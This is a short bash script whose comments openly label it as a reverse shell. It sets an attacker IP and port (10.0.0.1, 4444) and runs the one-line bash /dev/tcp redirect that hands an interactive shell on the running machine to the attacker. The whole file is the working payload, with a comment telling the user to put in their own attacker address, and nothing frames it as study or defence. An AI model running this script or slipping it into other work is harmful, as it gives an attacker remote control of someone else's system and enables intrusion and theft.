#!/bin/bash

# Change the IP address and port to the IP address and port of the attacker machine
attacker_ip="10.0.0.1"
attacker_port="4444"

# Open a reverse shell to the attacker machine
bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1